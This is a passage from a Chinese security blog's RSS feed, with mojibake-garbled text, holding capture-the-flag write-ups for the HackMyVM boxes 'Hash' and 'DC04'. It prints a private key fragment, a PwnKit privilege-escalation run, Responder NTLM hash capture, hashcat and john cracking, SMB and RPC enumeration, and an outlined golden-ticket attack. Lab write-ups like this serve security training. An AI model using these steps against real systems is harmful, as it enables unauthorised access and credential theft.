Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
+BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
-----END OPENSSH PRIVATE KEY-----
<br>ç„¶åå¯ä»¥ç”¨ç§é’¥è¿æ¥åˆ°marcoç”¨æˆ·ä¸Šå»<br>marco@hash:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hash

PWNED DATE: Wed 04 Dec 2024 09:45:49 PM EST

WHOAMI: uid=1000(marco) gid=1000(marco) groups=1000(marco),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hashmanready

------------------------

<br><br>æ£€æµ‹å­˜åœ¨Pwnkitæ¼æ´<br>marco@hash:~$ bash lzs.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<br>ä½†æ˜¯æœ¬åœ°æ²¡æœ‰gcc  æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æœ¬åœ°ç¼–è¯‘ï¼Œæˆ‘å°±åœ¨è‡ªå·±çš„kaliä¸Šç¼–è¯‘<br>
è€Œä¸”kaliçš„Libcä¸é¶æœºçš„ç‰ˆæœ¬ä¸åŒã€‚æ‰€ä»¥é‡‡ç”¨é™æ€ç¼–è¯‘<br>kalié™æ€ç¼–è¯‘
â”Œâ”€â”€(rootã‰¿kali)-[/home/pwnkit/CVE-2021-4034-main]
â””â”€# make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.

â”Œâ”€â”€(rootã‰¿kali)-[/home/pwnkit/CVE-2021-4034-main]
â””â”€# cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c

â”Œâ”€â”€(rootã‰¿kali)-[/home/pwnkit/CVE-2021-4034-main]
â””â”€# cc -Wall    cve-2021-4034.c   -o cve-2021-4034 -static

ç„¶åæŠŠ pwnkit.so  cve-2021-4034 ä¼ åˆ°é¶æœºè¿è¡Œå³å¯
marco@hash:~/CVE-2021-4034-main$ chmod +x cve-2021-4034
marco@hash:~/CVE-2021-4034-main$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
# sh /root/flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hash

PWNED DATE: Wed Dec  4 22:14:52 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)

FLAG: hashhater

------------------------



<br><br><br>mariaç”¨æˆ·çš„ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªmyterm.sh<br>marco@hash:/home/maria$ cat myterm.sh
export DISPLAY=:10
xterm
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/39.hash.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. ç½‘å€åˆ©ç”¨" data-href="#2.3. ç½‘å€åˆ©ç”¨" href="https://www.c1trus.top/about:blank#2.3._ç½‘å€åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç½‘å€åˆ©ç”¨</a>


<br><a data-tooltip-position="top" aria-label="3. websvcç”¨æˆ·" data-href="#3. websvcç”¨æˆ·" href="https://www.c1trus.top/about:blank#3._websvcç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3. websvcç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="3.1. NTLMä¸­æ¯’æ”»å‡»" data-href="#3.1. NTLMä¸­æ¯’æ”»å‡»" href="https://www.c1trus.top/about:blank#3.1._NTLMä¸­æ¯’æ”»å‡»" class="internal-link" target="_self" rel="noopener nofollow">3.1. NTLMä¸­æ¯’æ”»å‡»</a>
<br><a data-tooltip-position="top" aria-label="3.2. smbæ¢æµ‹" data-href="#3.2. smbæ¢æµ‹" href="https://www.c1trus.top/about:blank#3.2._smbæ¢æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.2. smbæ¢æµ‹</a>


<br><a data-tooltip-position="top" aria-label="4. rtina97ç”¨æˆ·" data-href="#4. rtina97ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._rtina97ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. rtina97ç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="4.1. rpcè·å–ç”¨æˆ·ä¿¡æ¯" data-href="#4.1. rpcè·å–ç”¨æˆ·ä¿¡æ¯" href="https://www.c1trus.top/about:blank#4.1._rpcè·å–ç”¨æˆ·ä¿¡æ¯" class="internal-link" target="_self" rel="noopener nofollow">4.1. rpcè·å–ç”¨æˆ·ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="4.2. ç ´è§£å‹ç¼©åŒ…" data-href="#4.2. ç ´è§£å‹ç¼©åŒ…" href="https://www.c1trus.top/about:blank#4.2._ç ´è§£å‹ç¼©åŒ…" class="internal-link" target="_self" rel="noopener nofollow">4.2. ç ´è§£å‹ç¼©åŒ…</a>
<br><a data-tooltip-position="top" aria-label="4.3. æŠ¥å‘Šå®¡è®¡" data-href="#4.3. æŠ¥å‘Šå®¡è®¡" href="https://www.c1trus.top/about:blank#4.3._æŠ¥å‘Šå®¡è®¡" class="internal-link" target="_self" rel="noopener nofollow">4.3. æŠ¥å‘Šå®¡è®¡</a>


<br><a data-tooltip-position="top" aria-label="5. é»„é‡‘ç¥¨æ®" data-href="#5. é»„é‡‘ç¥¨æ®" href="https://www.c1trus.top/about:blank#5._é»„é‡‘ç¥¨æ®" class="internal-link" target="_self" rel="noopener nofollow">5. é»„é‡‘ç¥¨æ®</a><br>
- <a data-tooltip-position="top" aria-label="5.1. åˆ©ç”¨æ¡ä»¶" data-href="#5.1. åˆ©ç”¨æ¡ä»¶" href="https://www.c1trus.top/about:blank#5.1._åˆ©ç”¨æ¡ä»¶" class="internal-link" target="_self" rel="noopener nofollow">5.1. åˆ©ç”¨æ¡ä»¶</a><br>
- <a data-tooltip-position="top" aria-label="5.2. è·å–åŸŸSID" data-href="#5.2. è·å–åŸŸSID" href="https://www.c1trus.top/about:blank#5.2._è·å–åŸŸSID" class="internal-link" target="_self" rel="noopener nofollow">5.2. è·å–åŸŸSID</a><br>
- <a data-tooltip-position="top" aria-label="5.3. åŒæ­¥åŸŸæ—¶é—´" data-href="#5.3. åŒæ­¥åŸŸæ—¶é—´" href="https://www.c1trus.top/about:blank#5.3._åŒæ­¥åŸŸæ—¶é—´" class="internal-link" target="_self" rel="noopener nofollow">5.3. åŒæ­¥åŸŸæ—¶é—´</a><br>
- <a data-tooltip-position="top" aria-label="5.4. ç”Ÿæˆç®¡ç†å‘˜çš„é»„é‡‘ç¥¨æ®" data-href="#5.4. ç”Ÿæˆç®¡ç†å‘˜çš„é»„é‡‘ç¥¨æ®" href="https://www.c1trus.top/about:blank#5.4._ç”Ÿæˆç®¡ç†å‘˜çš„é»„é‡‘ç¥¨æ®" class="internal-link" target="_self" rel="noopener nofollow">5.4. ç”Ÿæˆç®¡ç†å‘˜çš„é»„é‡‘ç¥¨æ®</a><br>
- <a data-tooltip-position="top" aria-label="5.5. å¯¼å…¥ç¥¨æ®åˆ°ç¯å¢ƒå˜é‡" data-href="#5.5. å¯¼å…¥ç¥¨æ®åˆ°ç¯å¢ƒå˜é‡" href="https://www.c1trus.top/about:blank#5.5._å¯¼å…¥ç¥¨æ®åˆ°ç¯å¢ƒå˜é‡" class="internal-link" target="_self" rel="noopener nofollow">5.5. å¯¼å…¥ç¥¨æ®åˆ°ç¯å¢ƒå˜é‡</a><br>
- <a data-tooltip-position="top" aria-label="5.6. PTT" data-href="#5.6. PTT" href="https://www.c1trus.top/about:blank#5.6._PTT" class="internal-link" target="_self" rel="noopener nofollow">5.6. PTT</a><br>
é¶æœºé“¾æ¥<br>
ä½œè€…<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/dc04]
â””â”€# fscan -h 192.168.69.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.69.4:139 open
192.168.69.4:80 open
192.168.69.4:135 open
192.168.69.4:445 open
192.168.69.4:88 open
[*] alive ports len is: 5
start vulscan
[*] NetBios 192.168.69.4    [+] DC:SOUPEDECODE\DC01
[*] NetInfo
[*]192.168.69.4
   [-&gt;]DC01
   [-&gt;]192.168.69.4
[*] WebTitle http://192.168.69.4       code:302 len:0      title:None è·³è½¬url: http://soupedecode.local
å·²å®Œæˆ 5/5
[*] æ‰«æç»“æŸ,è€—æ—¶: 3.264268642s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/dc04]
â””â”€# nmap -sCV 192.168.69.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 23:13 CST
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
Nmap scan report for 192.168.69.4
Host is up (0.00027s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://soupedecode.local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-05 07:13:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:13:99:85 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 15h59m57s
| smb2-time:
|   date: 2024-12-05T07:13:38
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:13:99:85 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.93 seconds

<br>é…ç½®hsots<br>
192.168.56.126 soupedecode.local DC01.soupedecode.local<br><br>[01:20:17] 200 -   10KB - /server-status/
[01:20:17] 200 -   10KB - /server-status
[01:20:18] 200 -  100KB - /server-info
<br>ç”¨dirsearchå¯ä»¥æ‰«å‡ºæ¥ä¸‰ä¸ªè·¯å¾„<br>
è®¿é—®åé‡Œé¢å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå­åŸŸå heartbeat.soupedecode.local æ·»åŠ åˆ°hostsé‡Œé¢<br>
<img alt="Pasted image 20241218142827" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" referrerpolicy="no-referrer"><br><br>è®¿é—®åå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªç™»å½•æ¡†<br>
<img alt="Pasted image 20241218142949" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142949.png" referrerpolicy="no-referrer"><br>åˆ©ç”¨burpè¿›è¡Œçˆ†ç ´ä¸€ä¸‹<br>
è¿™ä¸ªæœºå­å¾ˆåƒåœ¾ï¼Œçˆ†ç ´äº†å‡ ä¸‹å°±å‡ºé—®é¢˜äº†ã€‚åé¢æ€ä¹ˆéƒ½çˆ†ç ´éƒ½æ˜¯403äº†ã€‚é‡å¯ä¹Ÿæ²¡æœ‰ç”¨ï¼Œåªèƒ½é‡æ–°å®‰è£…äº†<br>
å»ºè®®è¿˜æ˜¯å¯åŠ¨äº†å°±ä¿å­˜ä¸€ä¸‹å¿«ç…§
<br>æœ€åæŠ¥å‡ºæ¥è´¦å·å¯†ç æ˜¯ admin:nimda<br>
ç™»å½•æˆåŠŸåä¼šè¦æ±‚ä½ è¾“å…¥ipåœ°å€<br>
<img alt="Pasted image 20241218152420" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218152420.png" referrerpolicy="no-referrer"><br><br><br>è¾“å…¥æˆ‘ä»¬kaliçš„ipç„¶åè¿›è¡Œç›‘å¬<br>
å¯ä»¥è·å–åˆ°ä¸€ä¸ªNTLMhash<br>â”Œâ”€â”€(rootã‰¿kali)-[/home]
â””â”€# responder -I eth1
[SMB] NTLMv2-SSP Client   : 192.168.56.126
[SMB] NTLMv2-SSP Username : soupedecode\websvc
[SMB] NTLMv2-SSP Hash     : websvc::soupedecode:3d80cf0d5de8656a:911B4595F70D957A0671068267CDF165:010100000000000000F21251F450DB01006098D655A71BC1000000000200080054004E0039004B0001001E00570049004E002D0032003200470032004D003200310036004B004100340004003400570049004E002D0032003200470032004D003200310036004B00410034002E0054004E0039004B002E004C004F00430041004C000300140054004E0039004B002E004C004F00430041004C000500140054004E0039004B002E004C004F00430041004C000700080000F21251F450DB01060004000200000008003000300000000000000000000000004000007EB2E40733876D4CE24083BC1F55F4CD7B7D843B3B343F98128E45BD39583DFF0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0035000000000000000000


<br>ç ´è§£hash<br>hashcat hash.txt rockyou.txt

WEBSVC::soupedecode:3d80cf0d5de8656a:911b4595f70d957a0671068267cdf165:010100000000000000f21251f450db01006098d655a71bc1000000000200080054004e0039004b0001001e00570049004e002d0032003200470032004d003200310036004b004100340004003400570049004e002d0032003200470032004d003200310036004b00410034002e0054004e0039004b002e004c004f00430041004c000300140054004e0039004b002e004c004f00430041004c000500140054004e0039004b002e004c004f00430041004c000700080000f21251f450db01060004000200000008003000300000000000000000000000004000007eb2e40733876d4ce24083bc1f55f4cd7b7d843b3b343f98128e45bd39583dff0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00350036002e0035000000000000000000:jordan23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEBSVC::soupedecode:3d80cf0d5de8656a:911b4595f70d95...000000
Time.Started.....: Wed Dec 18 02:39:31 2024 (0 secs)
Time.Estimated...: Wed Dec 18 02:39:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: jordan23 [8]
Guess.Queue......: 350/14336793 (0.00%)
Speed.#1.........:     4949 H/s (0.00ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: jordan23 -&gt; jordan23
Hardware.Mon.#1..: Util: 16%

Started: Wed Dec 18 02:38:56 2024
Stopped: Wed Dec 18 02:39:32 2024

<br>è·å–åˆ°ä¸€å¯¹è´¦å·å¯†ç  WEBSVC ï¼šjordan23 <br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# crackmapexec smb 192.168.56.126 -u websvc -p jordan23 --shares

SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\websvc:jordan23 STATUS_PASSWORD_EXPIRED

<br>
å¯†ç æ˜¯å¯¹çš„ åªæ˜¯è¿‡æœŸäº†ã€‚ ä¸ŠVboxæ›´æ–°ä¸€ä¸‹å¯†ç å³å¯
<br>æˆ‘è¿™é‡Œä¿®æ”¹åçš„å¯†ç æ˜¯ admin!@#45<br>
é‡æ–°æ£€æµ‹ä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# crackmapexec smb 192.168.56.126 -u websvc -p 'admin!@#45' --shares

SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\websvc:admin!@#45
SMB         192.168.56.126  445    DC01             [+] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.126  445    DC01             C               READ
SMB         192.168.56.126  445    DC01             C$                              Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share

<br>åœ¨ websvc ç”¨æˆ·ä¸‹å¯ä»¥è·å–åˆ°userflag<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# cat user.txt
709e449a996a85aa7deaf18c79515d6a  
<br>è€Œä¸”ä¹Ÿå¯ä»¥å‘ç°ä¸€äº›ç”¨æˆ·çš„ç›®å½•<br>smb: \users\&gt; ls
  .                                  DR        0  Wed Nov  6 20:55:53 2024
  ..                                DHS        0  Tue Nov  5 18:30:29 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  fjudy998                            D        0  Wed Nov  6 20:55:33 2024
  ojake987                            D        0  Wed Nov  6 20:55:16 2024
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  rtina979                            D        0  Wed Nov  6 20:54:39 2024
  websvc                              D        0  Wed Nov  6 20:44:11 2024
  xursula991                          D        0  Wed Nov  6 20:55:28 2024

<br>è¿™é‡Œé¢çš„ç”¨æˆ·æˆ‘ä»¬éœ€è¦ç€é‡å…³æ³¨ã€‚<br>rtina979
xursula991
fjudy998
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# rpcclient -U websvc%'admin!@#45' 192.168.56.126 -c "querydispinfo" |grep -E  'rtina979|xursula991|fjudy998'
index: 0x1330 RID: 0x80e acb: 0x00020010 Account: fjudy998      Name: Felix Judy        Desc: Music lover and aspiring guitarist
index: 0x131f RID: 0x7fd acb: 0x00020010 Account: rtina979      Name: Reed Tina Desc: Default Password Z~l3JhcV#7Q-1#M
index: 0x1329 RID: 0x807 acb: 0x00020010 Account: xursula991    Name: Ximena Ursula     Desc: Yoga practitioner and meditation lover

<br>è·å–åˆ°äº† rtina979 ç”¨æˆ·çš„é»˜è®¤å¯†ç  Z~l3JhcV#7Q-1#M<br>æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä½¿ç”¨<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# crackmapexec smb 192.168.56.126 -u rtina979 -p 'Z~l3JhcV#7Q-1#M'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M STATUS_PASSWORD_EXPIRED

<br>å¯ä»¥ä½¿ç”¨ã€‚å¯†ç è¿‡æœŸäº† ä¸ŠVboxä¿®æ”¹ä¸€ä¸‹å³å¯<br>
è¿™é‡Œæˆ‘ä¿®æ”¹æ–°å¯†ç ä¸º c1trus123<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# crackmapexec smb 192.168.56.126 -u rtina979 -p 'c1trus123'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:c1trus123
<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# smbmap -H 192.168.56.126 -u rtina979 -p c1trus123

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 192.168.56.126:445      Name: soupedecode.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C                                                       READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections


<br>åœ¨ rtina979 ç”¨æˆ·çš„ Documents ç›®å½•ä¸‹å¯ä»¥è·å–åˆ°ä¸€ä¸ªæ–‡ä»¶ Report.rar<br>smb: \users\rtina979\Documents\&gt; ls
  .                                  DR        0  Thu Nov  7 17:35:52 2024
  ..                                  D        0  Wed Nov  6 20:54:39 2024
  My Music                        DHSrn        0  Wed Nov  6 20:54:39 2024
  My Pictures                     DHSrn        0  Wed Nov  6 20:54:39 2024
  My Videos                       DHSrn        0  Wed Nov  6 20:54:39 2024
  Report.rar                          A   712046  Thu Nov  7 08:35:49 2024

                12942591 blocks of size 4096. 11014117 blocks available
smb: \users\rtina979\Documents\&gt; get Report.rar
getting file \users\rtina979\Documents\Report.rar of size 712046 as Report.rar (11589.3 KiloBytes/sec) (average 11589.3 KiloBytes/sec)

<br><br>æ­¤å‹ç¼©åŒ…æ¯åŠ å¯†äº† çˆ†ç ´ä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€#  rar2john Report.rar
Created directory: /root/.john
Report.rar:$rar5$16$7b74f4c32feb807c16edc906c283e524$15$872f8d1a914bd1503dac110c7bbb938a$8$3e15430028d503b5

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€#  rar2john Report.rar &gt;hash.txt

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD123      (Report.rar)
1g 0:00:00:33 DONE (2024-12-19 02:26) 0.02944g/s 1515p/s 1515c/s 1515C/s ang123..2pac4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

<br>æˆåŠŸçˆ†ç ´å‡ºå¯†ç  PASSWORD123<br><br>è§£å‹åæ˜¯ä¸€ä¸ªæ¸—é€æµ‹è¯•æŠ¥å‘Š<br>
åœ¨æŠ¥å‘Šçš„æœ€åå¯ä»¥è·å–åˆ° krbtgt çš„hash<br>
<img alt="Pasted image 20241219154237" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219154237.png" referrerpolicy="no-referrer"><br><br>
